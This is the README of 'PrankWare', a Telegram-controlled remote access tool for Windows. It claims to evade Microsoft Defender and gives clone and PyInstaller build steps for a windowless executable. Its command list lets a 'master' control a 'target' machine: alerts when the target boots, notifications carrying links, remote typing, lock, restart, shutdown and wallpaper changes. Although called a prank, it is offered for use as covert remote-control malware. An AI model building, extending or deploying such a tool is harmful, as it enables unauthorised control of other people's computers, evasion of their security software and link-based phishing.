# PrankWare

**PrankWare** is a remote access toolkit that enables you to remotely control any Windows system without being hindered by Microsoft Defender.

## Setup Instructions

1. Clone the repository:
   ```bash
   git clone https://github.com/JayanthJ2H/prankware.git
   ```

2. Open `start.py` and update the following variables:
   - **`botToken`**: Replace this with your actual Telegram bot token obtained from BotFather.
   - **`master_id`**: Replace this with your Telegram user ID to designate the master user, granting exclusive control.

3. Install the required package:
   ```bash
   pip install pyInstaller
   ```

4. Build the executable:
   ```bash
   pyinstaller --onefile --noconsole --icon=app.ico --add-data "install.bat;." --add-data "hacker.png;." --add-data "requirements.txt;." main.py
   ```

---

## Command Overview

| Command            | Description                                                                                                 |
|--------------------|-------------------------------------------------------------------------------------------------------------|
| `/hello`           | Returns your username                                                                                       |
| `/status`          | Returns the current status of the system                                                                    |
| `/notify`          | Activates **Notification Mode**                                                                             |
| `/stopNotify`      | Deactivates **Notification Mode**                                                                           |
| `/system`          | Activates **System Command Mode**                                                                           |
| `/stopSystem`      | Deactivates **System Command Mode**                                                                         |
| `/changewp`        | Changes the system's wallpaper                                                                              |

## Hello command
- Used for testing and identifying errors during the development process.

## Status command
- Message you "System is running" whenever the target turns on the computer

## Notification mode

To switch to **Notification Mode**:
- Send any text that will be sent via system notification.
- Use `site: www.site.com` to send a link with a "Visit Site" button in the notification.
- Use `type: <your-custom-text>` to write custom text in Notepad.
- Stop notification by sending /stopNotify.

---
## System Command Mode

To switch to **System Command Mode**:
- Use `lock` to lock the system.
- Use `restart` to restart the system.
- Use `shutdown` to shutdown the system.
- Stop system commands using by sending /stopSystem.

---
## Change Wallpaper

To change Wallpaper
- Use /changewp to change the system wallapaper to hacker photo (no need to send any picture)
---

## Scalable
PrankWare is designed with scalability in mind, making it easy to add new commands and functionalities. Modifying or adding new commands and features is straightforward, and pull requests are encouraged!

